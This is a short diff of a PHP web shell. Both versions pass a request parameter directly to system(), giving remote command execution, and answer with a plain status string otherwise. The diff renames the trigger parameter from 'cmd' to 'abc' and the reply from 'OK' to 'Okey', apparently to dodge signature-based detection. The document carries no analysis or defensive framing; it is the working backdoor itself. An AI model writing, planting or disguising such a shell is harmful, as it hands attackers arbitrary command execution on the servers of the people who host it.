@@ -1,7 +1,7 @@
 <?php
-if(isset($_REQUEST['cmd'])){
-    system($_REQUEST['cmd']);
+if(isset($_REQUEST['abc'])){
+    system($_REQUEST['abc']);
 }else{
-    echo 'OK';
+    echo 'Okey';
 }
 ?>
